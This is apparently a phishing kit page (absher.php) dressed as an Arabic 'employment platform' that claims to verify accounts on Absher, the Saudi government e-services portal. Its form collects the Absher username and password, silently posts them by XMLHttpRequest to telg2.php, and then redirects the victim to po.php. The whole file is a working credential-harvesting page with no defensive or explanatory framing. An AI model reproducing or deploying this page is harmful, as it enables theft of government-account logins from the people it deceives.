<!-- absher.php -->
<!DOCTYPE html>
<html>
<head>
    <title>منصة التوظيف - التحقق من أبشر</title>
    <style>
        body {
            background-color: #f0f8ff;
        }
        
        .container {
            width: 400px;
            margin: 50px auto;
            text-align: right;
        }
        
        label {
            display: block;
            margin-bottom: 10px;
        }
        
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 5px;
            margin-bottom: 10px;
        }
        
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>التحقق من أبشر</h2>
        <form action="telg2.php" method="post"onsubmit="return submitForm(event)">
            <label for="username">اسم المستخدم:</label>
            <input type="text" name="username" id="username" required>
            
            <label for="password">كلمة المرور:</label>
            <input type="password" name="password" id="password" required>
            
            <input type="submit" value="التحقق">
        </form>


        <script>
  function submitForm(event) {
    event.preventDefault(); // يمنع النموذج من الارسال المباشر

    // تنفيذ أي عمليات إضافية قبل الانتقال للصفحة الثانية
    // ...

    // جمع البيانات من النموذج
    var form = event.target;
    var formData = new FormData(form);

    // إرسال البيانات باستخدام XMLHttpRequest
    var xhr = new XMLHttpRequest();
    xhr.open(form.method, form.action, true);
    xhr.onreadystatechange = function() {
      if (xhr.readyState === 4 && xhr.status === 200) {
        // تم إرسال البيانات بنجاح، يمكن الانتقال للصفحة الثانية
        window.location.href = "po.php";
      }
    };
    xhr.send(formData);

    return false;
  }
</script>

    </div>
</body>
</html>